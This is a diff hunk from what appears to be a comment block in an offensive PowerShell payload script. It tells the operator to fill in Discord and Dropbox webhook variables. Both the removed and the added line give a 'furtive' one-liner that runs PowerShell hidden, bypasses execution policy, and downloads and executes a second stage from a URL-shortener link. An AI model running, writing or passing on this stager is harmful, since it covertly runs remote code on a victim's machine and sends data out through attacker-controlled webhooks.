@@ -10,7 +10,7 @@ Need to modify the invoke command to fit your needs :
  	-Put your dropbox webhook into $db=''
 
 Invoke powershell + stage 2 into it + be furtive : 
-powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/fiZ38 | iex
+powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/qNWZ6 | iex
 
 
 #>
